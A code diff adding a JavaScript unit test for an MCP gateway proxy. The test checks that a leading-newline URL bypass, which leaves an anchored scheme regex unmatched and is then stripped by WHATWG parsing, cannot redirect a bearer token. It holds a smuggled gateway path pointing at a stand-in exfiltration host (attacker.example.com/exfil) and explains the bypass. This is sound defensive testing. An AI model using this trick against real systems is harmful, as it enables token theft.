@@ -1552,4 +1552,37 @@ describe('forwardRequest — GATEWAY_PATH safety + query-string preservation', (
     );
     assert.equal(capture.captured.path, '/mcp');
   });
+
+  test('backstop catches leading-whitespace scheme-prefix bypass class', async () => {
+    // The module-load GATEWAY_PATH scheme regex `^[a-z][a-z0-9+.-]*:` is
+    // anchored at position 0 with `[a-z]`. WHATWG URL parser strips leading
+    // ASCII whitespace per spec, so `\nhttp://attacker.com` bypasses an
+    // anchored regex (position 0 is `\n`, not in `[a-z]`) AND then the `\n`
+    // gets stripped during URL parsing — same WHATWG-strip class that bit
+    // validateAudience in 23e44ba. Module-load now rejects this via the
+    // `[\x00-\x20\x7f]` upfront check (added post-PR-#5 review). This
+    // test exercises the in-flight backstop in forwardRequest — proves
+    // that even if a future code path constructs gatewayPath dynamically
+    // and skips the module-load check, the origin-mismatch backstop still
+    // blocks the token leak. Defense-in-depth verification.
+    const tokenCache = createTokenCache({
+      execGcloudFn: async () => 'fake-jwt',
+      now: () => 0
+    });
+    await assert.rejects(
+      forwardRequest(
+        { jsonrpc: '2.0', method: 'tools/list', id: 1 },
+        {
+          tokenCache,
+          httpRequestFn: capturingHttpRequest({ statusCode: 200, body: '{}' }),
+          gatewayUrl: 'https://mcp.hafla.com',
+          // Leading newline; WHATWG parser strips it, then sees an
+          // absolute URL → base ignored → url.origin escapes.
+          gatewayPath: '\nhttp://attacker.example.com/exfil',
+          requestTimeoutMs: 1000
+        }
+      ),
+      /refusing to send token/
+    );
+  });
 });
